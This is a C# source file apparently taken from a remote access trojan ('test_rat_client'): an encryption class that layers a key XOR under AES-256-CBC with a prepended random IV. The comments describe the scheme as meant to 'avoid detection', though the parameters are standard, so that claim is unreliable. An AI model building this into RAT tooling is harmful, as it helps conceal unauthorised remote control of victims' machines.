using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace test_rat_client
{
    class Encryption
    {
        // Custom encryption layer to add complexity
        private static byte[] CustomXOR(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        // Generate random IV for each encryption
        private static byte[] GenerateRandomIV()
        {
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                byte[] iv = new byte[16];
                rng.GetBytes(iv);
                return iv;
            }
        }

        public static byte[] Encrypt(byte[] data, byte[] Key)
        {
            byte[] encrypted;
            // Generate random IV for each encryption
            byte[] IV = GenerateRandomIV();

            // First layer: Custom XOR encryption
            byte[] preEncrypted = CustomXOR(data, Key);

            using (Aes aesAlg = Aes.Create())
            {
                // Modify AES parameters to avoid detection
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.Padding = PaddingMode.PKCS7;
                aesAlg.KeySize = 256;
                aesAlg.BlockSize = 128;

                aesAlg.Key = Key;
                aesAlg.IV = IV;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    // Write IV at the beginning of the stream
                    msEncrypt.Write(IV, 0, IV.Length);

                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        csEncrypt.Write(preEncrypted, 0, preEncrypted.Length);
                        csEncrypt.FlushFinalBlock();
                    }
                    encrypted = msEncrypt.ToArray();
                }
                encryptor.Dispose();
            }
            return encrypted;
        }

        public static byte[] Decrypt(byte[] data, byte[] Key)
        {
            byte[] decrypted;

            // Extract IV from the beginning of the encrypted data
            byte[] IV = new byte[16];
            byte[] encryptedData = new byte[data.Length - 16];
            Buffer.BlockCopy(data, 0, IV, 0, 16);
            Buffer.BlockCopy(data, 16, encryptedData, 0, data.Length - 16);

            using (Aes aesAlg = Aes.Create())
            {
                // Match encryption parameters
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.Padding = PaddingMode.PKCS7;
                aesAlg.KeySize = 256;
                aesAlg.BlockSize = 128;

                aesAlg.Key = Key;
                aesAlg.IV = IV;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Write))
                    {
                        cs.Write(encryptedData, 0, encryptedData.Length);
                        cs.FlushFinalBlock();
                        decrypted = ms.ToArray();
                    }
                }
                decryptor.Dispose();
            }

            // Reverse custom XOR encryption
            return CustomXOR(decrypted, Key);
        }
    }
}
